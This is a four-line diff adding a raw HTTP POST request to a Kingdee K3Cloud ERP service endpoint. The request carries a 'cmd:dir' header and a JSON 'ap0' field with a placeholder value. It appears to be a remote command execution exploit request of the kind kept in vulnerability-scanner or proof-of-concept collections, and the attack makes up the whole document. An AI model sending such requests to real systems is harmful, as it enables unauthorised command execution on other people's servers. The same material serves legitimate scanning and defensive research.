@@ -1,0 +1,4 @@
+POST /k3cloud/Kingdee.BOS.ServiceFacade.ServicesStub.DynamicForm.DynamicFormService.CloseForm.common.kdsvc HTTP/1.1
+cmd:dir
+
+{"ap0":"AAAAAAAA"}
